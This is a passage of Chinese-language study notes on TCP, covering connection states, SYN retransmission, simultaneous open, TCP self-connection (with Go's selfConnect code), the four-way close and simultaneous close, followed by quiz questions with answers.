<p>3.如果在 <code>SYN-SENT</code> 状态收到了服务端的确认包，它将发送确认服务端 SYN 报文的 ACK 包，同时进入 ESTABLISHED 状态，表明自己已经准备好发送数据。</p>
<p>对于服务端而言：</p>
<p>1.初始状态同样是 <code>CLOSED</code> 状态</p>
<p>2.在执行 <code>bind</code>、<code>listen</code> 调用以后进入 <code>LISTEN</code>状态，等待客户端连接。</p>
<p>3.当收到客户端的 SYN 同步报文以后，会回复确认同时发送自己的 SYN 同步报文，这时服务端进入 <code>SYN-RCVD</code> 阶段等待客户端的确认。</p>
<p>4.当收到客户端的确认报文以后，进入<code>ESTABLISHED</code> 状态。这时双方可以互相发数据了。</p>
<h3 id="如何构造一个-SYN-SENT-状态的连接"><a href="#如何构造一个-SYN-SENT-状态的连接" class="headerlink" title="如何构造一个 SYN_SENT 状态的连接"></a>如何构造一个 SYN_SENT 状态的连接</h3><p>使用我们前面介绍的 packetdrill 可以轻松构造一个 <code>SYN_SENT</code> 状态的连接（发出 SYN 包对端没有回复的状况）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 新建一个 server socket</span><br><span class="line">+0   socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 客户端 connect</span><br><span class="line">+0 connect(3, ..., ...) &#x3D; -1</span><br></pre></td></tr></table></figure>
<p>执行 netstat 命令可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -atnp | grep -i 8080                                                                                                    </span><br><span class="line">tcp        0      1 192.168.46.26:42678     192.0.2.1:8080          SYN_SENT    3897&#x2F;packetdrill</span><br></pre></td></tr></table></figure>
<p>执行 tcpdump 抓包<code>sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap</code>，使用 wireshark 可以看到没有收到对端 ACK 的情况下，SYN 包重传了 6 次，这个值是由<code>/proc/sys/net/ipv4/tcp_syn_retries</code>决定的， 在我的 Centos 机器上，这个值等于 6</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_syn_retries</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/59.jpg"></p>
<p>6次重试（65s = 1s+2s+4s+8s+16s+32s)以后放弃重试，connect 调用返回 -1，调用超时，如果是用 Java 等语言就会返回<code>java.net.ConnectException: Connection timed out</code>异常</p>
<h3 id="同时打开"><a href="#同时打开" class="headerlink" title="同时打开"></a>同时打开</h3><p>TCP 支持同时打开，但是非常罕见，使用场景也比较有限，不过我们还是简单介绍一下。它们的包交互过程是怎么样的？TCP 状态变化又是怎么样的呢？</p>
<p>包交互的过程如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/60.jpg"></p>
<p>以其中一方为例，记为 A，另外一方记为 B</p>
<p>1.最初的状态是<code>CLOSED</code></p>
<p>2.A 发起主动打开，发送 SYN 给 B，然后进入<code>SYN-SENT</code>状态</p>
<p>3.A 还在等待 B 回复的 ACK 的过程中，收到了 B 发过来的 SYN，what are you 弄啥咧，A 没有办法，只能硬着头皮回复<code>SYN+ACK</code>，随后进入<code>SYN-RCVD</code></p>
<p>4.A 依旧死等 B 的 <code>ACK</code></p>
<p>5.好不容易等到了 B 的 ACK，对于 A 来说连接建立成功</p>
<p>同时打开在通信两端时延比较大情况下比较容易模拟，我还没有在本地模拟成功。</p>
<h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要介绍了三次握手的相关的内容，我们来回顾一下。</p>
<p>首先介绍了三次握手交换 <code>ISN</code> 的细节：</p>
<p>1.SYN <code>段长度为 0</code> 却需要<code>消耗一个序列号</code>，原因是 SYN 段<code>需要对端确认</code></p>
<p>2.ACK <code>段长度为 0</code>，不消耗序列号，也不用对端确认</p>
<p>3.ISN 不能从一个固定的值开始，原因是处于<code>安全性</code>和避免前后连接<code>互相干扰</code></p>
<p>接下来首次介绍了 TCP 的状态机，TCP 的这 11 中状态的变化是 TCP 学习的重中之重。</p>
<p>接下来用 packetdrill 轻松构造了一个 SYN_SENT 状态的 TCP 连接，随后通过这个例子介绍了这本小册第一个 TCP 定时器<code>「连接建立定时器」</code>，这个定时器会在发送第一个 SYN 包以后开启，如果没有收到对端 ACK，会重传指定的次数。</p>
<p>最后我们介绍了同时打开这种比较罕见的建立连接的方式。</p>
<h3 id="作业题-3"><a href="#作业题-3" class="headerlink" title="作业题"></a>作业题</h3><p>1、TCP 协议三次握手建立一个连接，第二次握手的时候服务器所处的状态是（A）</p>
<pre><code>A、SYN_RECV
B、ESTABLISHED
C、SYN-SENT
D、LAST_ACK</code></pre>
<p>2、下面关于三次握手与connect()函数的关系说法错误的是（B）</p>
<pre><code>A、客户端发送 SYN 给服务器
B、服务器只发送 SYN 给客户端
C、客户端收到服务器回应后发送 ACK 给服务器
D、connect() 函数在三次握手的第二次返回</code></pre>
<h2 id="10-聊聊-TCP-自连接那些事"><a href="#10-聊聊-TCP-自连接那些事" class="headerlink" title="10 聊聊 TCP 自连接那些事"></a>10 聊聊 TCP 自连接那些事</h2><p>TCP 的自连接是一个比较有意思的现象，甚至很多人认为是 Linux 内核的 bug。我们先来看看 TCP 的自连接是什么。</p>
<h3 id="TCP-自连接是什么"><a href="#TCP-自连接是什么" class="headerlink" title="TCP 自连接是什么"></a>TCP 自连接是什么</h3><p>新建一个脚本 self_connect.sh，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	nc 127.0.0.1 50000</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>执行这段脚本之前先用 netstat 等命令确认 50000 没有进程监听。然后执行脚本，经过一段时间，telnet 居然成功了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Trying 127.0.0.1...</span><br><span class="line">telnet: connect to address 127.0.0.1: Connection refused</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">telnet: connect to address 127.0.0.1: Connection refused</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure>
<p>使用 netstat 查看当前的 50000 端口的连接状况，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 127.0.0.1:50000         127.0.0.1:50000         ESTABLISHED 24786&#x2F;telnet</span><br></pre></td></tr></table></figure>
<p>可以看到源 IP、源端口是 <code>127.0.0.1:50000</code>，目标 ip、目标端口也是 <code>127.0.0.1:50000</code>，通过上面的脚本，我们连上了本来没有监听的端口号。</p>
<h3 id="自连接原因分析"><a href="#自连接原因分析" class="headerlink" title="自连接原因分析"></a>自连接原因分析</h3><p>自连接成功的抓包结果如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/61.jpg"></p>
<p>对于自连接而言，上图中 wireshark 中的每个包的发送接收双方都是自己，所以可以理解为总共是六个包，包的交互过程如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/62.jpg"></p>
<p>这个图是不是似曾相识？前四个包的交互过程就是 TCP 同时打开的过程。</p>
<p>当一方主动发起连接时，操作系统会自动分配一个<code>临时端口号</code>给连接主动发起方。如果<code>刚好分配</code>的临时端口是 50000 端口，过程如下。</p>
<p>1.第一个包是发送 SYN 包给 <code>50000</code> 端口</p>
<p>2.对于发送方而已，它收到了这个 <code>SYN</code> 包，以为对方是想同时打开，会回复 <code>SYN+ACK</code></p>
<p>3.回复 SYN+ACK 以后，它自己就会收到这个 SYN+ACK，以为是对方回的，对它而已握手成功，进入 <code>ESTABLISHED</code> 状态</p>
<h3 id="自连接的危害"><a href="#自连接的危害" class="headerlink" title="自连接的危害"></a>自连接的危害</h3><p>设想一个如下的场景：</p>
<pre><code>你写的业务系统 B 会访问本机服务 A，服务 A 监听了 50000 端口
业务系统 B 的代码写的稍微比较健壮，增加了对服务 A 断开重连的逻辑
如果有一天服务 A 挂掉比较长时间没有启动，业务系统 B 开始不断 connect 重连
系统 B 经过一段时间的重试就会出现自连接的情况
这时服务 A 想启动监听 50000 端口就会出现地址被占用的异常，无法正常启动</code></pre>
<p>如果出现了自连接，至少有两个显而易见的问题：</p>
<p>1.自连接的进程占用了端口，导致真正需要监听端口的服务进程<code>无法监听成功</code><br>2.自连接的进程看起来 connect 成功，实际上服务是不正常的，无法正常进行数据通信</p>
<h3 id="如何解决自连接问题"><a href="#如何解决自连接问题" class="headerlink" title="如何解决自连接问题"></a>如何解决自连接问题</h3><p>自连接比较罕见，但一旦出现逻辑上就有问题了，因此要尽量避免。解决自连接有两个常见的办法。</p>
<p>1.让服务监听的端口与客户端随机分配的端口不可能相同即可</p>
<p>2.出现自连接的时候，主动关掉连接</p>
<p>对于第一种方法，客户端随机分配的范围由 <code>/proc/sys/net/ipv4/ip_local_port_range</code> 文件决定，在我的 Centos 8 上，这个值的范围是 32768~60999，只要服务监听的端口小于 32768 就不会出现客户端与服务端口相同的情况。这种方式比较推荐。</p>
<p>对于第二种方法，我第一次见是在 Golang 的 TCP connect 的代码，代码如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">func (sd *sysDialer) doDialTCP(ctx context.Context, laddr, raddr *TCPAddr) (*TCPConn, error) &#123;</span><br><span class="line">	fd, err :&#x3D; internetSocket(ctx, sd.network, laddr, raddr, syscall.SOCK_STREAM, 0, &quot;dial&quot;, sd.Dialer.Control)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; TCP has a rarely used mechanism called a &#39;simultaneous connection&#39; in</span><br><span class="line">	&#x2F;&#x2F; which Dial(&quot;tcp&quot;, addr1, addr2) run on the machine at addr1 can</span><br><span class="line">	&#x2F;&#x2F; connect to a simultaneous Dial(&quot;tcp&quot;, addr2, addr1) run on the machine</span><br><span class="line">	&#x2F;&#x2F; at addr2, without either machine executing Listen. If laddr &#x3D;&#x3D; nil,</span><br><span class="line">	&#x2F;&#x2F; it means we want the kernel to pick an appropriate originating local</span><br><span class="line">	&#x2F;&#x2F; address. Some Linux kernels cycle blindly through a fixed range of</span><br><span class="line">	&#x2F;&#x2F; local ports, regardless of destination port. If a kernel happens to</span><br><span class="line">	&#x2F;&#x2F; pick local port 50001 as the source for a Dial(&quot;tcp&quot;, &quot;&quot;, &quot;localhost:50001&quot;),</span><br><span class="line">	&#x2F;&#x2F; then the Dial will succeed, having simultaneously connected to itself.</span><br><span class="line">	&#x2F;&#x2F; This can only happen when we are letting the kernel pick a port (laddr &#x3D;&#x3D; nil)</span><br><span class="line">	&#x2F;&#x2F; and when there is no listener for the destination address.</span><br><span class="line">	&#x2F;&#x2F; It&#39;s hard to argue this is anything other than a kernel bug. If we</span><br><span class="line">	&#x2F;&#x2F; see this happen, rather than expose the buggy effect to users, we</span><br><span class="line">	&#x2F;&#x2F; close the fd and try again. If it happens twice more, we relent and</span><br><span class="line">	&#x2F;&#x2F; use the result. See also:</span><br><span class="line">	&#x2F;&#x2F;	https:&#x2F;&#x2F;golang.org&#x2F;issue&#x2F;2690</span><br><span class="line">	&#x2F;&#x2F;	https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;4949858&#x2F;</span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line">	&#x2F;&#x2F; The opposite can also happen: if we ask the kernel to pick an appropriate</span><br><span class="line">	&#x2F;&#x2F; originating local address, sometimes it picks one that is already in use.</span><br><span class="line">	&#x2F;&#x2F; So if the error is EADDRNOTAVAIL, we have to try again too, just for</span><br><span class="line">	&#x2F;&#x2F; a different reason.</span><br><span class="line">	&#x2F;&#x2F;</span><br><span class="line">	&#x2F;&#x2F; The kernel socket code is no doubt enjoying watching us squirm.</span><br><span class="line">	for i :&#x3D; 0; i &lt; 2 &amp;&amp; (laddr &#x3D;&#x3D; nil || laddr.Port &#x3D;&#x3D; 0) &amp;&amp; (selfConnect(fd, err) || spuriousENOTAVAIL(err)); i++ &#123;</span><br><span class="line">		if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">			fd.Close()</span><br><span class="line">		&#125;</span><br><span class="line">		fd, err &#x3D; internetSocket(ctx, sd.network, laddr, raddr, syscall.SOCK_STREAM, 0, &quot;dial&quot;, sd.Dialer.Control)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	return newTCPConn(fd), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func selfConnect(fd *netFD, err error) bool &#123;</span><br><span class="line">	&#x2F;&#x2F; If the connect failed, we clearly didn&#39;t connect to ourselves.</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return false</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; The socket constructor can return an fd with raddr nil under certain</span><br><span class="line">	&#x2F;&#x2F; unknown conditions. The errors in the calls there to Getpeername</span><br><span class="line">	&#x2F;&#x2F; are discarded, but we can&#39;t catch the problem there because those</span><br><span class="line">	&#x2F;&#x2F; calls are sometimes legally erroneous with a &quot;socket not connected&quot;.</span><br><span class="line">	&#x2F;&#x2F; Since this code (selfConnect) is already trying to work around</span><br><span class="line">	&#x2F;&#x2F; a problem, we make sure if this happens we recognize trouble and</span><br><span class="line">	&#x2F;&#x2F; ask the DialTCP routine to try again.</span><br><span class="line">	&#x2F;&#x2F; TODO: try to understand what&#39;s really going on.</span><br><span class="line">	if fd.laddr &#x3D;&#x3D; nil || fd.raddr &#x3D;&#x3D; nil &#123;</span><br><span class="line">		return true</span><br><span class="line">	&#125;</span><br><span class="line">	l :&#x3D; fd.laddr.(*TCPAddr)</span><br><span class="line">	r :&#x3D; fd.raddr.(*TCPAddr)</span><br><span class="line">	return l.Port &#x3D;&#x3D; r.Port &amp;&amp; l.IP.Equal(r.IP)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里详细解释了为什么有 selfConnect 方法的判断，判断是否是自连接的逻辑是判断源 IP 和目标 IP 是否相等，源端口号和目标端口号是否相等。</p>
<h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>到这里，TCP 自连接的知识就介绍完了，在以后写 web 服务监听端口时，记得看下机器上的端口范围，不要胡来。</p>
<h2 id="11-相见时难别亦难-——-谈谈四次挥手"><a href="#11-相见时难别亦难-——-谈谈四次挥手" class="headerlink" title="11 相见时难别亦难 —— 谈谈四次挥手"></a>11 相见时难别亦难 —— 谈谈四次挥手</h2><h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/63.jpg"></p>
<p>1、客户端调用 <code>close</code> 方法，执行「主动关闭」，会发送一个 FIN 报文给服务端，从这以后客户端不能再发送数据给服务端了，客户端进入<code>FIN-WAIT-1</code>状态。FIN 报文其实就是将 FIN 标志位设置为 1。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/64.jpg"></p>
<p><code>FIN 段是可以携带数据的</code>，比如客户端可以在它最后要发送的数据块可以“捎带” FIN 段。当然也可以不携带数据。不管 FIN 段是否携带数据，都需要消耗一个序列号。</p>
<p>客户端发送 FIN 包以后不能再发送数据给服务端，但是还可以接受服务端发送的数据。这个状态就是所谓的「<code>半关闭</code>（half-close）」</p>
<p>主动发起关闭的一方称为<code>「主动关闭方」</code>，另外一段称为<code>「被动关闭方」</code>。</p>
<p>2、服务端收到 <code>FIN</code> 包以后回复确认 <code>ACK</code> 报文给客户端，服务端进入 <code>CLOSE_WAIT</code>，客户端收到 ACK 以后进入<code>FIN-WAIT-2</code>状态。</p>
<p>3、服务端也没有数据要发送了，发送 FIN 报文给客户端，然后进入<code>LAST-ACK</code> 状态，等待客户端的 ACK。同前面一样如果 FIN 段没有携带数据，也需要消耗一个序列号。</p>
<p>4、客户端收到服务端的 FIN 报文以后，回复 ACK 报文用来确认第三步里的 FIN 报文，进入<code>TIME_WAIT</code>状态，等待 2 个 MSL 以后进入 <code>CLOSED</code>状态。服务端收到 ACK 以后进入<code>CLOSED</code>状态。TIME_WAIT是一个很神奇的状态，后面有文章会专门介绍。</p>
<h3 id="为什么-FIN-报文要消耗一个序列号"><a href="#为什么-FIN-报文要消耗一个序列号" class="headerlink" title="为什么 FIN 报文要消耗一个序列号"></a>为什么 FIN 报文要消耗一个序列号</h3><p>如三次握手的 SYN 报文一样，不管是否携带数据，FIN 段都需要消耗一个序列号。我们用一个图来解释，如果 FIN 段不消耗一个序列号会发生什么。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/65.jpg"></p>
<p>如上图所示，如果 <code>FIN</code> 包不消耗一个序列号。客户端发送了 100 字节的数据包和 FIN 包，都等待服务端确认。如果这个时候客户端收到了ACK=1000 的确认包，就<code>无法得知到底是 100 字节的确认包还是 FIN 包的确认包</code>。</p>
<h3 id="为什么挥手要四次，变为三次可以吗？"><a href="#为什么挥手要四次，变为三次可以吗？" class="headerlink" title="为什么挥手要四次，变为三次可以吗？"></a>为什么挥手要四次，变为三次可以吗？</h3><p>首先我们先明确一个问题，TCP 连接终止一定要四次包交互吗？三次可以吗？</p>
<p>当然可以，因为有<code>延迟确认</code>的存在，把第二步的 ACK 经常会跟随第三步的 FIN 包一起捎带会对端。延迟确认后面有一节专门介绍。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/66.jpg"></p>
<p>一个真实的 wireshark 抓包如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/67.jpg"></p>
<p>其实这个行为跟应用层有比较大的关系，因为发送 <code>FIN</code> 包以后，会进入<code>半关闭</code>（half-close）状态，表示自己不会再给对方发送数据了。因此如果服务端收到客户端发送的 FIN 包以后，只能表示客户端不会再给自己发送数据了，但是服务端这个时候是可以给客户端发送数据的。</p>
<p>在这种情况下，如果不及时发送 ACK 包，死等服务端这边发送数据，可能会造成客户端不必要的重发 FIN 包，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/68.jpg"></p>
<p>如果服务端确定没有什么数据需要发给客户端，那么当然是可以把 FIN 和 ACK 合并成一个包，四次挥手的过程就成了三次。</p>
<h3 id="握手可以变为四次吗？"><a href="#握手可以变为四次吗？" class="headerlink" title="握手可以变为四次吗？"></a>握手可以变为四次吗？</h3><p>其实理论上完全是可以的，把三次握手的第二次的 SYN+ACK 拆成先回 ACK 包，再发 SYN 包就变成了「四次握手」</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/69.jpg"></p>
<p>与 FIN 包不同的是，一般情况下，SYN 包都不携带数据，收到客户端的 SYN 包以后不用等待，可以立马回复 SYN+ACK，四次握手理论上可行，但是现实中我还没有见过。</p>
<h3 id="同时关闭"><a href="#同时关闭" class="headerlink" title="同时关闭"></a>同时关闭</h3><p>前面介绍的都是一端收到了对端的 FIN，然后回复 ACK，随后发送自己的 FIN，等待对端的 ACK。TCP 是全双工的，当然可以两端同时发起 FIN 包。如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/70.jpg"></p>
<p>以客户端为例</p>
<p>1.最初客户端和服务端都处于 <code>ESTABLISHED</code> 状态</p>
<p>2.客户端发送 <code>FIN</code> 包，等待对端对这个 FIN 包的 ACK，随后进入 <code>FIN-WAIT-1</code> 状态</p>
<p>3.处于FIN-WAIT-1状态的客户端还没有等到 ACK，收到了服务端发过来的 <code>FIN</code> 包</p>
<p>4.收到 FIN 包以后客户端会发送对这个 FIN 包的的确认 ACK 包，同时自己进入 <code>CLOSING</code> 状态</p>
<p>5.继续等自己 FIN 包的 ACK</p>
<p>6.处于 CLOSING 状态的客户端终于等到了ACK，随后进入<code>TIME-WAIT</code></p>
<p>7.在<code>TIME-WAIT</code>状态持续 <code>2*MSL</code>，进入<code>CLOSED</code>状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 服务端发送 FIN</span><br><span class="line">0.150 close(4) &#x3D; 0</span><br><span class="line">0.150 &gt; F. 1:1(0) ack 1 &lt;...&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 客户端发送 FIN</span><br><span class="line">0.150 &lt; F. 1:1(0) ack 2 win 65535</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 服务端回复 ACK</span><br><span class="line">0.150 &gt; .  2:2(0) ack 2 &lt;...&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 客户端回复 ACK</span><br><span class="line">0.150 &lt; . 2:2(0) ack 2 win 65535</span><br></pre></td></tr></table></figure>
<p>使用 <code>netstat</code> 查看连接状态，可以看到两端都进入了TIME_WAIT 状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -tnpa | grep -i 8080                                                                </span><br><span class="line">tcp        0      0 192.168.198.228:8080    0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 192.168.198.228:8080    192.0.2.1:35769         TIME_WAIT   -                   </span><br><span class="line">tcp        0      0 192.168.220.28:8080     192.0.2.1:35780         TIME_WAIT   -     </span><br></pre></td></tr></table></figure>
<p>使用 wireshark 抓包如下图所示，完整的抓包文件可以在这里下载。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/71.jpg"></p>
<p>当然上面的脚本并不能每次模拟出两端都进入<code>TIME_WAIT</code>的状态，取决于在发送 <code>FIN</code>包之前有没有提前收到对端的 FIN 包。如果在发送 FIN 之前收到了对端的 FIN，只会有一段进入<code>TIME_WAIT</code></p>
<h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><p>这篇文章介绍了四次挥手断开连接的细节，然后用图解的方式介绍了为什么 FIN 包需要占用一个序列号。随后引出了为什么挥手要四次的问题，最后通过 packetdrill 的方式模拟了同时关闭。</p>
<h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><p>1、HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：(C)</p>
<pre><code>A、CLOSE_WAIT
B、LAST_ACK
C、FIN_WAIT2
D、TIME_WAIT</code></pre>
<p>2、正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是 (C)</p>
<pre><code>A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT
B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT
C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT
D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT</code></pre>
